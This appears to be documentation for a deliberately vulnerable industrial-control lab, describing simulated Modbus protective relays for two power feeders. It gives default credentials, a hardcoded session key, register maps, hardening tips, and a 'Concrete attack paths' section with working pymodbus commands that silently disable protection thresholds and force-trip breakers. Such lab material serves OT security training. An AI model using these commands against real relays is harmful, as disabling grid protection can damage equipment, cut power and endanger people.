# Protective relay IED

`uupl-relay-a` and `uupl-relay-b` are the protective relay IEDs for the Dolly
Sisters and Nap Hill feeders. They monitor line voltage, current, and turbine
speed, and trip the corresponding circuit breaker if any measurement crosses a
threshold. The thresholds are held in Modbus holding registers. The holding
registers are writable by anyone on the network with no authentication. The web
interface uses `admin` / `relay1234`. These have not been changed since the
firmware was updated in 2019.

The practical result is that an attacker who reaches port 502 can silently
disable all three protection functions without touching the breaker or the PLC.

## Real-world deployment context

Protective relay IEDs are designed to trip circuits under fault conditions and
protect both equipment and personnel. In real deployments, relays with Modbus
TCP interfaces are common, and the "the network IS the access control" assumption
applies here as strongly as to PLCs. The pattern of writable threshold registers
is not a simulation artefact: real relay IEDs with Ethernet management interfaces
expose similar register maps, and manipulation of protection thresholds is an
established attack technique in OT intrusions.

## Container details

Base image: `python:3.11-slim`. No SSH.

Packages: `pymodbus 3.6.9`, `flask 3.0.3`, `paho-mqtt 1.6.1`, `snmpd`.

Two instances run from the same image: relay A (IP 10.10.3.31, Feeder A / Dolly
Sisters) and relay B (IP 10.10.3.32, Feeder B / Nap Hill). Each is configured
via environment variables set by the orchestrator.

Exposed ports:
- 502/tcp: Modbus TCP (no authentication)
- 8081/tcp: Flask web interface (admin / relay1234)
- 161/udp: SNMP (community `public` read, `private` read-write)

Modbus register map:

Holding Registers (FC3, writable):
- 0: undervoltage_threshold_v (default 196, 85% of 230V)
- 1: overcurrent_threshold_a (default 200)
- 2: overspeed_threshold_rpm (default 3300)

Input Registers (FC4, read-only, mirrored from PLC):
- 0: line_voltage_v
- 1: line_current_a
- 2: frequency_hz_x10
- 3: turbine_rpm

Coils (FC1):
- 0: relay_trip_status (1 = tripped; writable, force-trip attack vector)

MQTT: publishes trip events to `uupl/relay/{a|b}/trip` when a fault is detected
or after a failed reclose.

Reclose behaviour: after a trip, the relay waits 10 seconds and attempts to
reclose the breaker. If the fault condition persists after reclose, it re-trips
and logs a "reclose-failed" event.

## Connections

- `ics_control`: 10.10.3.31 (relay A) / 10.10.3.32 (relay B)
- Polls PLC at 10.10.3.21:502 every 500 ms for measurement data
- Writes to breaker actuators at 10.10.3.53 (A) / 10.10.3.54 (B) on fault
- Publishes trip events to MQTT broker at 10.10.3.60

## Protocols

Modbus TCP: port 502.
HTTP: port 8081.
SNMP: UDP port 161.
MQTT: outbound to port 1883.

## Built-in vulnerabilities

Writable protection thresholds: HR[0] (undervoltage), HR[1] (overcurrent), and
HR[2] (overspeed) can be written by any Modbus client on the network with no
authentication. Setting undervoltage to 0 disables undervoltage protection.
Setting overcurrent to 1000 disables overcurrent protection. Setting overspeed
to 4000 disables overspeed protection. None of these writes produce any visible
indicator on the web UI or in the trip log.

Force-trip coil: writing coil 0 = 1 from Modbus trips the breaker immediately
as if a fault had occurred, without any fault condition being present.

Default web credentials: `admin` / `relay1234`. The web interface allows
changing the same protection thresholds that are writable via Modbus. It also
provides a force-trip button and displays the last 10 trip events.

SNMP read-write community: same pattern as the turbine PLC.

MQTT trip events: unauthenticated. Any subscriber to `uupl/relay/{a|b}/trip`
receives trip cause, voltage, current, and RPM at the time of the trip.

The Flask session key is the string `hex1234unseen`, hardcoded in the source.

## Modifying vulnerabilities

To change the web credentials: edit the comparison in the `/login` route in
`relay_server.py`.

To make threshold registers read-only: change the Modbus data block for holding
registers from writable (`hr=ModbusSequentialDataBlock(...)`) to input registers
(`ir=...`) and update the read path accordingly.

To change SNMP community strings: edit `snmpd.conf.template`.

To disable MQTT: remove the `_mqtt_publish_trip` call from `relay_logic_loop`
and the paho-mqtt pip install.

## Hardening suggestions

Lock the protection threshold registers to read-only over Modbus. Add
authentication to the web interface using a role that does not default to
`admin` / `relay1234`. Change SNMP community strings. Audit any host that has
a network route to port 502 on the relay IEDs.

## Observability and debugging

```bash
docker logs ied-relay-a
docker logs ied-relay-b
docker exec -it ied-relay-a bash
curl http://10.10.3.31:8081/      # relay A web UI
curl http://10.10.3.32:8081/      # relay B web UI
```

Read current thresholds:
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.31',502); c.connect(); print(c.read_holding_registers(0,3,slave=1).registers)"
```

Subscribe to trip events:
```bash
mosquitto_sub -h 10.10.3.60 -t 'uupl/relay/+/trip'
```

## Concrete attack paths

Disable undervoltage protection on relay A (silently, via Modbus):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.31',502); c.connect(); c.write_register(0,0,slave=1)"
```

Disable all three protection functions on both relays:
```python
from pymodbus.client import ModbusTcpClient
for ip in ['10.10.3.31', '10.10.3.32']:
    c = ModbusTcpClient(ip, port=502)
    c.connect()
    c.write_registers(0, [0, 1000, 4000], slave=1)  # UV=0, OC=max, OS=max
    c.close()
```

Force-trip relay A via Modbus:
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.31',502); c.connect(); c.write_coil(0,True,slave=1)"
```

Via the web interface: log in with `admin` / `relay1234`, use the force-trip
button or the threshold configuration form.

## Odd behaviours

Each relay instance has its own independent Modbus register store. Writing
thresholds to relay A does not affect relay B's registers; both need to be
modified separately to disable protection on both feeders.

The PLC also holds a copy of the overcurrent threshold in HR[3]. This is the
PLC's own alarm threshold, not the relay's. Modifying the PLC value does not
affect the relay's behaviour; modifying the relay's HR[1] does.

The web interface force-trip sets the Modbus trip coil and calls `_breaker_write`
directly. The trip log records the event with cause "manual" in the UI session.
A Modbus force-trip (writing coil 0 directly) does not go through the trip log.

Relay B's register map is identical to relay A's. The only difference is the
environment variables (`RELAY_ID`, `FEEDER`, `BREAKER_IP`, `VOLTAGE_REG`,
`CURRENT_REG`) set by the orchestrator.

## The short version

Protective relay IEDs for both distribution feeders. Protection thresholds in
Modbus holding registers, writable by anyone on the network. Setting all three
to zero/maximum disables all protection silently. Web interface at `admin` /
`relay1234` does the same thing with a button. Force-tripping via coil 0
disconnects the feeder immediately.
